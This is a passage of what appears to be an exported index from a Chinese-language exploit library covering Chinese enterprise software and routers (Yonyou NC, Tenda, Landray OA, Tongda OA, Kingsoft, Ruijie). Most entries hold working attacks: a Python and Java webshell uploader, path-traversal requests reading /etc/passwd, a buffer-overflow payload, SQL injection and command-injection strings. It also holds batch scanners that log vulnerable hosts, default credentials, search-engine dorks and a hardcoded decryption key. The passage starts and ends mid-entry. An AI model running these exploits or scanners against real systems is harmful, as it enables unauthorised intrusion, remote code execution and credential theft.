\"\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x11\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x48\\x61\\x73\\x68\\x4d\\x61\\x70\\x05\\x07\\xda\\xc1\\xc3\\x16\\x60\\xd1\\x03\\x00\\x02\\x46\\x00\\x0a\\x6c\\x6f\\x61\\x64\\x46\\x61\\x63\\x74\\x6f\\x72\\x49\\x00\\x09\\x74\\x68\\x72\\x65\\x73\\x68\\x6f\\x6c\\x64\\x78\\x70\\x3f\\x40\\x00\\x00\\x00\\x00\\x00\\x0c\\x77\\x08\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x02\\x74\\x00\\x09\\x46\\x49\\x4c\\x45\\x5f\\x4e\\x41\\x4d\\x45\\x74\\x00\\x09\\x74\\x30\\x30\\x6c\\x73\\x2e\\x6a\\x73\\x70\\x74\\x00\\x10\\x54\\x41\\x52\\x47\\x45\\x54\\x5f\\x46\\x49\\x4c\\x45\\x5f\\x50\\x41\\x54\\x48\\x74\\x00\\x10\\x2e\\x2f\\x77\\x65\\x62\\x61\\x70\\x70\\x73\\x2f\\x6e\\x63\\x5f\\x77\\x65\\x62\\x78\" shellFlag=\"t0test0ls\" uploadData+=shellFlag try: req1 = requests.post(u + \"/servlet/FileReceiveServlet\", headers=uploadHeader, verify=False, data=uploadData, timeout=25) if req1.status_code == 200 : req3=requests.get(u+\"/t00ls.jsp\",headers=header, verify=False, timeout=25) if req3.text.index(shellFlag)>=0: printFlag = \"[Getshell]\" + u+\"/t00ls.jsp\" + \"\\n\" print (printFlag) wirte_targets(printFlag, \"vuln.txt\") except : pass #print(printFlag, end=\"\") if __name__ == \"__main__\": if (len(sys.argv)) example http://127.0.0.1\",type=str,dest='check_url') parser.add_argument('-r',help=\"url list to file\",type=str,dest='check_file') args =parser.parse_args() if args.check_url: exp(args.check_url) if(args.check_file): multithreading(exp, args.check_file, 8) via:maliya java poc： import java.io.*; import java.util.HashMap; import java.util.Map; public class App { public static void main(String[] args) throws Exception { String url=\"http://192.168.40.222\"; Map metaInfo=new HashMap(); metaInfo.put(\"TARGET_FILE_PATH\",\"webapps/nc_web\"); metaInfo.put(\"FILE_NAME\",\"cmd.jsp\"); ByteArrayOutputStream baos=new ByteArrayOutputStream(); ObjectOutputStream oos=new ObjectOutputStream(baos); oos.writeObject(metaInfo); InputStream in=App.class.getResourceAsStream(\"cmd.jsp\"); byte[] buf=new byte[1024]; int len=0; while ((len=in.read(buf))!=-1){ baos.write(buf,0,len); } HttpClient.post(url+\"/servlet/FileReceiveServlet\",baos.toByteArray()); HttpResult result=HttpClient.get(url+\"/cmd.jsp?cmd=echo+aaaaaa\"); if(result.getData().contains(\"aaaaaa\")){ System.out.println(\"shell路径:\"+url+\"/cmd.jsp?cmd=whoami\"); }else{ System.out.println(\"上传shell失败或者漏洞不存在\"); } } } Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/碧海威科技 L7 多款产品 后台命令执行.html":{"url":"Edge_Security/碧海威科技 L7 多款产品 后台命令执行.html","title":"碧海威科技 L7 多款产品 后台命令执行","keywords":"","body":"碧海威科技 L7 多款产品 后台命令执行 碧海威 L7多款产品存在 后台命令执行漏洞，攻击者通过账号密码登录后台后，通过命令拼接造成命令注入。 默认密码：admin/admin 或 admin/admin123 后台 - 系统维护 - 命令控制台： help&cat /etc/passwd via:peiqi Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/网康 NS-ASG安全网关 任意文件读取漏洞.html":{"url":"Edge_Security/网康 NS-ASG安全网关 任意文件读取漏洞.html","title":"网康 NS-ASG安全网关 任意文件读取漏洞","keywords":"","body":"网康 NS-ASG安全网关 任意文件读取漏洞 网康 NS-ASG安全网关 cert_download.php 文件存在任意文件读取漏洞. poc： GET /admin/cert_download.php?file=test.txt&certfile=../../../../../../../../etc/passwd HTTP/1.1 Host: 测试NS-ASG 6.3版本受影响。 via:peiqi Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/腾达路由器 AC11 堆栈缓冲区溢出（CVE-2021-31758）.html":{"url":"Edge_Security/腾达路由器 AC11 堆栈缓冲区溢出（CVE-2021-31758）.html","title":"腾达路由器 AC11 堆栈缓冲区溢出（CVE-2021-31758）","keywords":"","body":"腾达路由器 AC11 堆栈缓冲区溢出（CVE-2021-31758） 在固件为02.03.01.104_CN的Tenda AC11设备上发现了一个问题。/goform/setportList 中的堆栈缓冲区溢出漏洞使攻击者可以通过精心设计的post请求在系统上执行任意代码。 详情可以见：https://github.com/Yu3H0/IoT_CVE/tree/main/Tenda/CVE_2 poc： POST /goform/setportList HTTP/1.1 Host: 192.168.0.1 Content-Length: 717 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36 Content-Type: application/x-www-form-urlencoded; Accept: */* Origin: http://192.168.0.1 Referer: http://192.168.0.1/index.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close module1=wifiBasicCfg&doubleBandUnityEnable=false&wifiTotalEn=true&wifiEn=true&wifiSSID=Tenda_B0E040&portList=1234aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&wifiSecurityMode=WPAWPA2%2FAES&wifiPwd=Password12345&wifiHideSSID=false&wifiEn_5G=true&wifiSSID_5G=Tenda_B0E040_5G&wifiSecurityMode_5G=WPAWPA2%2FAES&wifiPwd_5G=Password12345&wifiHideSSID_5G=false&module2=wifiGuest&guestEn=false&guestEn_5G=false&guestSSID=Tenda_VIP&guestSSID_5G=Tenda_VIP_5G&guestPwd=&guestPwd_5G=&guestValidTime=8&guestShareSpeed=0&module3=wifiPower&wifiPower=high&wifiPower_5G=high&module5=wifiAdvCfg&wifiMode=bgn&wifiChannel=auto&wifiBandwidth=auto&wifiMode_5G=ac&wifiChannel_5G=auto&wifiBandwidth_5G=auto&wifiAntijamEn=false&module6=wifiBeamforming&wifiBeaformingEn=true&module7=wifiWPS&wpsEn=true&wanType=static Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/腾达路由器 D151-D31未经身份验证的配置下载.html":{"url":"Edge_Security/腾达路由器 D151-D31未经身份验证的配置下载.html","title":"腾达路由器 D151-D31未经身份验证的配置下载","keywords":"","body":"腾达路由器 D151/D31未经身份验证的配置下载 攻击者可利用此漏洞，通过请求{IP}/goform/getimage即可下载当前路由器配置（包括管理员登录名），也可以通过请求激活telnet服务/goform/telnet（默认情况下该服务已启用）。 影响版本： D301 1.2.11.2_EN D301 V2.0 50.22.1.8_EN D151 V2.0 50.21.1.5_EN poc.py: import struct import itertools import random, sys import requests import base64 FETCH_CODE = \"\\x80\\x0f\\x07\\xe7\\x83i\\xb0@v2\\x9c\\x8ef\\x93y\\xb8z\" ADMIN_LOG_CFG = {'AdminPassword': 'admin', 'SupportPassword': 'support'} CLEAR_CODE = 256 END_OF_CODE = CLEAR_CODE + 1 MIN_WIDTH = 8 DEFAULT_MIN_BITS = MIN_WIDTH + 1 DEFAULT_MAX_BITS = 12 def cmsDecoder(compressed_cfg): _cp_dict = dict((pt, struct.pack(\"B\", pt)) for pt in range(256)) _cp_dict[CLEAR_CODE] = CLEAR_CODE _cp_dict[END_OF_CODE] = END_OF_CODE prefix, offset, ignore = None, 0, 0 codepoints_arr, remainder, bits = [], [], [] init_csize = len(_cp_dict) codesize = init_csize minwidth = MIN_WIDTH while (1 > bitindex)) for nextbit in buts_arr: offset = (offset + 1) % 8 if ignore > 0: ignore = ignore - 1 continue bits.append(nextbit) if len(bits) == pointwidth: cp_int = 0 lsb_first = [b for b in bits] lsb_first.reverse() for bit_index in range(len(lsb_first)): if lsb_first[bit_index]: cp_int = cp_int | (1 = (2 ** pointwidth): pointwidth = pointwidth + 1 if cp_int == END_OF_CODE: ignore = (8 - offset) % 8 decodedBytes = [] for cp_int in codepoints_arr: suffix = \"\" if cp_int == CLEAR_CODE: _cp_dict = dict((pt, struct.pack(\"B\", pt)) for pt in range(256)) _cp_dict[CLEAR_CODE] = CLEAR_CODE _cp_dict[END_OF_CODE] = END_OF_CODE prefix = None elif cp_int != END_OF_CODE: if cp_int in _cp_dict: suffix = _cp_dict[cp_int] if None != prefix: _cp_dict[len(_cp_dict)] = prefix + suffix[0] else: suffix = prefix + prefix[0] _cp_dict[len(_cp_dict)] = suffix prefix = suffix decoded = suffix for char in decoded: decodedBytes.append(char) return decodedBytes def exploit(ip): print \"[!] Downloading config\" try: r = requests.get(\"http://{}/goform/getimage\".format(ip)) pass except: print \"[-] Failed to download the config, the target may not be vulnerable\" BIN_CONTENT = r.content BIN_CONTENT = BIN_CONTENT[BIN_CONTENT.index(FETCH_CODE):][:16*50] CONFIG_XML = b\"\".join(cmsDecoder(BIN_CONTENT)) USER_, PASS_ = \"\", \"\" for i in ADMIN_LOG_CFG.keys(): if i in CONFIG_XML: CONFIG_XML = CONFIG_XML[CONFIG_XML.index(i) + len(i) + 1:] PASS_ = CONFIG_XML[:CONFIG_XML.index(' ref: https://github.com/BenChaliah/Tenda_D151_D301_POC Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/致远OA A8-V5 任意文件读取.html":{"url":"Edge_Security/致远OA A8-V5 任意文件读取.html","title":"致远OA A8-V5 任意文件读取","keywords":"","body":"致远OA A8-V5 任意文件读取 影响老版本，默认读取数据库配置文件。 POST /seeyon/officeservlet HTTP/1.1 Host: target ... DBSTEP V3.0 331 0 0 currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66 RECORDID=wLehP4whzUoiw=66 CREATEDATE=wLehP4whzUoiw=66 originalFileId=wV66 needReadFile=NrMGyV66 originalCreateDate=wLehP4whzUoiw=66 OPTION=LKDxOWOWLlxwVlOW COMMAND=BSTLOlMSOCQwOV66 TEMPLATE=qf85qf85qfDfeazQqAzvcRevy1W3eazvNaMUySz3d7TsdRDsyaM3nYli affairMemberId=wV66 affairMemberName=N1liNg66 ref： https://mp.weixin.qq.com/s/xZT7RRRxsNX6BN3bwFK67A Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/蓝凌OA custom.jsp 任意文件读取漏洞.html":{"url":"Edge_Security/蓝凌OA custom.jsp 任意文件读取漏洞.html","title":"蓝凌OA custom.jsp 任意文件读取漏洞","keywords":"","body":"蓝凌OA custom.jsp 任意文件读取漏洞 漏洞利用 出现漏洞的文件為 custom.jsp, 请求包如下： POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Length: 42 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip var={\"body\":{\"file\":\"file:///etc/passwd\"}} ref:https://mp.weixin.qq.com/s/TkUZXKgfEOVqoHKBr3kNdw Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/蓝凌OA EKP 后台SQL注入漏洞 CNVD-2021-01363.html":{"url":"Edge_Security/蓝凌OA EKP 后台SQL注入漏洞 CNVD-2021-01363.html","title":"蓝凌OA EKP 后台SQL注入漏洞 CNVD-2021-01363","keywords":"","body":"蓝凌OA EKP 后台SQL注入漏洞 CNVD-2021-01363 深圳市蓝凌软件股份有限公司数字OA(EKP)存在SQL注入漏洞。攻击者可利用漏洞获取数据库敏感信息。 漏洞影响 2021-3-24 前版本 存在SQL注入的 Url为 https://xxx.xxx.xxx.xxx/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=1&ordertype=down&s_ajax=true SQL注入的参数为 ordeby ， 数据包如下: GET /km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=1&ordertype=down&s_ajax=true HTTP/1.1 Host: xxx.xxx.xxx.xxx Connection: keep-alive sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: cross-site Sec-Fetch-Mode: navigate Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: UM_distinctid=1785f7392888e1-02ece8c7e9a996-5771031-1fa400-1785f73928943d; landray_danyuan=null; landray_guanjianci=null; landray_sorce=baidupinzhuanwy; landray_jihua=null; Hm_lvt_223eecc93377a093d4111a2d7ea28f51=1616509114,1616566341,1616566350; Hm_lpvt_223eecc93377a093d4111a2d7ea28f51=1616566350; Hm_lvt_d14cb406f01f8101884d7cf81981d8bb=1616509114,1616566341,1616566350; j_lang=zh-CN; Hm_lvt_95cec2a2f107db33ad817ed8e4a3073b=1616510026,1616566523; Hm_lvt_95f4f43e7aa1fe68a51c44ae4eed925d=1616509969,1616509973,1616566507,1616568455; Hm_lpvt_95f4f43e7aa1fe68a51c44ae4eed925d=1616568455; Hm_lpvt_d14cb406f01f8101884d7cf81981d8bb=1616568455; Hm_lvt_22f1fea4412727d23e6a998a4b46f2ab=1616509969,1616509973,1616566507,1616568455; Hm_lpvt_22f1fea4412727d23e6a998a4b46f2ab=1616568455; fd_name=%E5%95%8A%E7%9A%84%E5%93%88; fd_id=1785f817dd0f5a4beaa482646cb9a2d8; nc_phone=15572002383; add_customer=0; JSESSIONID=F4A2DFFF611470A0AA00C1B4CEB0800B; LtpaToken=AAECAzYwNUI0NTRBNjA1QkVFMEFsaXd3MjYdcI6ajDXZSNpXOsKhMSNAGaQ=; original_name=16b53df64e78c7c0ab2d4e54165a6415; roletype=%E6%A8%A1%E5%9D%97%E7%AE%A1%E7%90%86%E5%91%98; Hm_lpvt_95cec2a2f107db33ad817ed8e4a3073b=1616594251 ref: https://mp.weixin.qq.com/s/jnmB8h9UCztt-FL3aKmn0g https://www.cnvd.org.cn/flaw/show/CNVD-2021-01363 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/蓝凌OA 前台 SSRF 到 RCE.html":{"url":"Edge_Security/蓝凌OA 前台 SSRF 到 RCE.html","title":"蓝凌OA 前台 SSRF 到 RCE","keywords":"","body":"蓝凌OA 前台 SSRF 到 RCE 详情分析可以见：https://mp.weixin.qq.com/s/fNovp4mbKIMkVdF2ywcQcQ SSRF 漏洞位置： /sys/ui/extend/varkind/custom.jsp 读password: POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1 Host: ... var={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}} 解密： import com.landray.kmss.util.DESEncrypt; public class main { public static void main(String[] args) { String password = \"mqwEyqHLj9PQXpy+yhf4z92SejWx+VeS\"; String resul=doPasswordDecrypt(password); System.out.println(resul); } public static String doPasswordDecrypt(String password) { try { DESEncrypt des = new DESEncrypt(\"kmssAdminKey\"); return des.decryptString(password); } catch (Exception ex) { try { DESEncrypt des0 = new DESEncrypt(\"kmssAdminKey\", true); return des0.decryptString(password); } catch (Exception e) { return \"ヾﾉ≧∀≦)o\"; } } } } 解密后得到明文密码登录后使用xmldecoder反序列化. /sys/search/sys_search_main/sysSearchMain.do?method=editParam&fdParemNames=11&fdParameters= XMLDecoder-payload-generator生成payload: https://github.com/mhaskar/XMLDecoder-payload-generator from：https://mp.weixin.qq.com/s/fNovp4mbKIMkVdF2ywcQcQ Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/蓝海卓越计费管理系统 任意文件读取漏洞.html":{"url":"Edge_Security/蓝海卓越计费管理系统 任意文件读取漏洞.html","title":"蓝海卓越计费管理系统 任意文件读取漏洞","keywords":"","body":"蓝海卓越计费管理系统 任意文件读取漏洞 蓝海卓越计费管理系统 download.php文件存在任意文件读取漏洞，攻击者通过 ../ 遍历目录可以读取服务器上的敏感文件. poc： GET /download.php?file=../../../../../etc/passwd HTTP/1.1 Host: via：peiqi Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/通达OA11.7 任意用户登陆.html":{"url":"Edge_Security/通达OA11.7 任意用户登陆.html","title":"通达OA11.7 任意用户登陆","keywords":"","body":"通达OA11.7 任意用户登陆 条件需要管理员在线 http://192.168.1.22/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0 访问路径，覆盖了session直接用cookie登陆，访问目录/general/进入后台 访问目标后台 http://xxx.xxx.xxx.xxx/general/ 当目标离线时则访问漏洞页面则会出现：RELOGIN 5秒一次测试用户是否在线 通过此思路可以持续发包监控此页面来获取在线用户的Cookie 404实验室的分析：https://paper.seebug.org/1492/ ref： https://www.o2oxy.cn/3158.html https://mp.weixin.qq.com/s/5M40Oux_89dgy5QAUhULGg Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/通达OA11.7 未授权RCE.html":{"url":"Edge_Security/通达OA11.7 未授权RCE.html","title":"通达OA11.7 未授权RCE","keywords":"","body":"通达OA11.7 未授权RCE 任意用户登陆+获取安装目录+任意文件读取+ssrf-->redis -->写入文件-->getshell 一、 通过任意用户登陆拿到管理员的cookie 二、获取安装目录读取redis 配置文件 三、 ssrf 写入文件 四、getshell 详情：https://mp.weixin.qq.com/s/LJRI04VViL4hbt6dbmGHAw Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/通达OA11.9 低权限SQL注入漏洞.html":{"url":"Edge_Security/通达OA11.9 低权限SQL注入漏洞.html","title":"通达OA11.9 低权限SQL注入漏洞","keywords":"","body":"通达OA11.9 低权限SQL注入漏洞 利用条件：任意一个用户PHPSESSID 后台堆叠注入 -> 修改日志getshell \\general\\appbuilder\\modules\\portal\\controllers\\WorkbenchController.php: PoC： POST /general/appbuilder/web/portal/workbench/upsharestatus HTTP/1.1 Host: ... uid=5&status=1&id=2;select sleep(3) ref： catw0rld Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/金和OA C6 后台越权敏感文件遍历漏洞.html":{"url":"Edge_Security/金和OA C6 后台越权敏感文件遍历漏洞.html","title":"金和OA C6 后台越权敏感文件遍历漏洞","keywords":"","body":"金和OA C6 后台越权敏感文件遍历漏洞 金和OA C6 存在后台越权敏感文件遍历漏洞，普通用户通过遍历特殊参数可以获取其他用户上传的敏感文件 FOFA: app=\"金和网络-金和OA\" 详情可以看：https://mp.weixin.qq.com/s/90HM3LqODBN35iqRBRE1HA poc.py： import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 金和OA C6 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, file_id, cookie): vuln_url = target_url + \"/C6/control/OpenFile.aspx?id={}&name=&type=pdf\".format(file_id) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\":cookie } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 Url: {}\\033[0m\".format(vuln_url)) if \"strFilePath =\" in response.text and response.status_code == 200: strFilePath = re.findall(r\"var strFilePath = '(.*?)';\", response.text)[0] strFileType = strFilePath[-3:] strFileIDCode = re.findall(r\"var strFileIDCode='(.*?)';\", response.text)[0] strId = re.findall(r\"var strId = '(.*?)';\", response.text)[0] sid = re.findall(r'ASP.NET_SessionId=(.*?);', cookie)[0] if strFilePath != \"\": print(\"\\033[36m[o] 目标 {} 存在漏洞, 获取文件信息:\\n[o] 文件路径：{}\\n[o] 文件类型：{}\\n[o] 文件ID code：{}\\n[o] 文件编号：{}\\033[0m\".format(target_url, strFilePath, strFileType,strFileIDCode, strId )) print(\"\\033[32m[o] 文件下载链接为: {}/C6/JHSoft.Web.CustomQuery/uploadFileDownLoad.aspx?Decrypt=&FileID={}&FileIDCode={}&sid={}\".format(target_url, strId, strFileIDCode, sid)) else: print(\"\\033[31m[x] 目标 {} 文件不存在 \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 目标 {} 不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) file_id = str(input(\"\\033[35mFile_id >>> \\033[0m\")) cookie = str(input(\"\\033[35mCookie >>> \\033[0m\")) POC_1(target_url, file_id, cookie) Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/金山 V8 终端安全系统 pdf_maker.php 未授权 RCE.html":{"url":"Edge_Security/金山 V8 终端安全系统 pdf_maker.php 未授权 RCE.html","title":"金山 V8 终端安全系统 pdf_maker.php 未授权 RCE","keywords":"","body":"金山 V8 终端安全系统 pdf_maker.php 未授权 RCE 金山 V8 终端安全系统 pdf_maker.php 存在命令执行漏洞，由于没有过滤危险字符，导致构造特殊字符即可进行命令拼接执行任意命令. 漏洞文件：Kingsoft\\Security Manager\\SystemCenter\\Console\\inter\\pdf_maker.php PoC： POST /inter/pdf_maker.php HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 45 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: PHPSESSID=noei1ghcv9rqgp58jf79991n04 url=IiB8fCBpcGNvbmZpZyB8fA%3D%3D&fileName=xxx //\"|| ipconfig || 进行base64编码传入即可。 via：https://mp.weixin.qq.com/s/zaNvtagdCTx9XtGeotWoYw Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/金山 V8 终端安全系统 任意文件读取漏洞.html":{"url":"Edge_Security/金山 V8 终端安全系统 任意文件读取漏洞.html","title":"金山 V8 终端安全系统 任意文件读取漏洞","keywords":"","body":"金山 V8 终端安全系统 任意文件读取漏洞 漏洞复现： 存在漏洞的文件 /htmltopdf/downfile.php 文件中没有任何的过滤 通过filename参数即可下载任意文件 poc: http://xxx.xxx.xxx.xxx/htmltopdf/downfile.php?filename=downfile.php from: PeiQi Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/金山终端安全系统 V8-V9存在文件上传漏洞.html":{"url":"Edge_Security/金山终端安全系统 V8-V9存在文件上传漏洞.html","title":"金山终端安全系统 V8-V9存在文件上传漏洞","keywords":"","body":"金山终端安全系统 V8/V9存在文件上传漏洞 程序下载链接 ： V8：http://duba-011.duba.net/netversion/Package/KAVNETV8Plus.iso%20%22v8%E4%B8%8B%E8%BD%BD%22 V9：http://duba-011.duba.net/netversion/Package/SecManage.iso%20%22v9%E4%B8%8B%E8%BD%BD%22 漏洞点:/tools/manage/upload.php 在tools目录下的mange下存在一个upload.php。该文件可导致任意文件上传 PoC： POST /tools/manage/upload.php HTTP/1.1 HOST: target ... ref： https://forum.butian.net/share/76 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/银澎云计算 好视通视频会议系统 任意文件下载.html":{"url":"Edge_Security/银澎云计算 好视通视频会议系统 任意文件下载.html","title":"银澎云计算 好视通视频会议系统 任意文件下载","keywords":"","body":"银澎云计算 好视通视频会议系统 任意文件下载 银澎云计算 好视通视频会议系统 存在任意文件下载，攻击者可以通过漏洞获取敏感信息。 fofa： app=\"Hanming-Video-Conferencing\" poc： GET /register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini HTTP/1.1 Host: ref： https://mp.weixin.qq.com/s/F-M21PT0xn9QOuwoC8llKA Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/锐捷 EG 易网关RCE 0day.html":{"url":"Edge_Security/锐捷 EG 易网关RCE 0day.html","title":"锐捷 EG 易网关RCE 0day","keywords":"","body":"锐捷 EG 易网关RCE 0day 后台的rce，不过可以获取账户密码，然后登录后进行rce。 FOFA: app=\"Ruijie-EG易网关\" PoC：xxx ref: https://forum.ywhack.com/thread-115511-1-4.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/锐捷-EWEB网管系统RCE.html":{"url":"Edge_Security/锐捷-EWEB网管系统RCE.html","title":"锐捷-EWEB网管系统RCE","keywords":"","body":"锐捷-EWEB网管系统RCE FOFA: icon_hash=\"-692947551\" EXP: POST /guest_auth/guestIsUp.php HTTP/1.1 Host: 127.0.0.1:9999 Connection: keep-alive Content-Length: 45 Pragma: no-cache Cache-Control: no-cache Accept: application/json, text/javascript, */*; q=0.01 Origin: http://127.0.0.1:9999 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Content-Type: application/x-www-form-urlencoded Referer: http://127.0.0.1:9999/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 mac=1&ip=`busybox ping -c 1 dnslog` 批量验证： # via：cHr1s import requests import threading import threadpool import random //随机文件名 def random_str(randomlength=6): random_str = '' base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789' length = len(base_str) - 1 for i in range(randomlength): random_str += base_str[random.randint(0, length)] return random_str //批量检测 def RJ_RCE(url): name = \"\"+random_str()+\".txt\" payload = \"|ls -al > \"+name+\"\" data = \"mac=1&ip=127.0.0.1\"+payload+\"\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\", \"Cookie\": \"LOCAL_LANG_COOKIE=zh; sysmode=sys-mode%20gateway; UI_LOCAL_COOKIE=zh\", \"Connection\": \"close\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: requests.packages.urllib3.disable_warnings() r = requests.post(url=url+'/guest_auth/guestIsUp.php',headers=headers,data=data,verify=False,timeout=30) rs = requests.get(url=url+'/guest_auth/'+name,headers=headers,verify=False) if name in rs.text: print('\\n[ + ] successful: '+url+'/guest_auth/'+name+' [ + ]') with open('rjrce_success_url.txt','a') as f: f.write(url+'\\n') else: print('\\n[ - ] Some problems happened: '+url+' [ - ]') except: print('[ - ] Timeout: '+url+' [ - ]\\n') def main(): with open('url.txt','r') as f: lines = f.read().splitlines() pool = threadpool.ThreadPool(5) requests = threadpool.makeRequests(RJ_RCE,lines) for req in requests: pool.putRequest(req) pool.wait() if __name__ == '__main__': main() ref: https://forum.ywhack.com/thread-114888-1-1.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/锐捷RG-UAC 账户硬编码漏洞.html":{"url":"Edge_Security/锐捷RG-UAC 账户硬编码漏洞.html","title":"锐捷RG-UAC 账户硬编码漏洞","keywords":"","body":"锐捷RG-UAC 账户硬编码漏洞 fofa： title=\"RG-UAC登录页面\" PoC1： 登录页面直接查看源代码，搜索：password PoC2: 